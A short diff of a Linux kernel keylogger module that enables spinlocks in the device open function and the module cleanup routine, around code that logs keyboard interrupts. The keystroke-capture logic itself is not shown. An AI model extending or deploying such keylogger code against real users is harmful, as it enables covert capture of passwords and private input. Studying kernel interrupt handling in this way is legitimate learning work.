@@ -249,10 +249,10 @@ static int	open_key(struct inode *node, struct file *file)
 	int	ret;
 
 	pr_info("device open.\n");
-	// spin_lock_irq(&lock);
+	spin_lock(&lock);
 	pr_info("single open\n");
 	ret = single_open(file, &key_prepare_show, NULL);
-	// spin_unlock_irq(&lock);
+	spin_unlock(&lock);
 	return ret;
 }
 
@@ -370,12 +370,12 @@ static void		key_log_print_unified(void)
 static void		__exit keylogger_clean(void)
 {
 	pr_info(MODULE_NAME "Cleaning up module.\n");
-	// spin_lock_irq(&lock);
+	spin_lock(&lock);
 	key_log_print_unified();
 	free_irq(KEYBOARD_IRQ, &key_handler);
 	misc_deregister(&dev);
 	key_log_clean();
-	// spin_unlock_irq(&lock);
+	spin_unlock(&lock);
 }
 
 static int		__init hello_init(void)
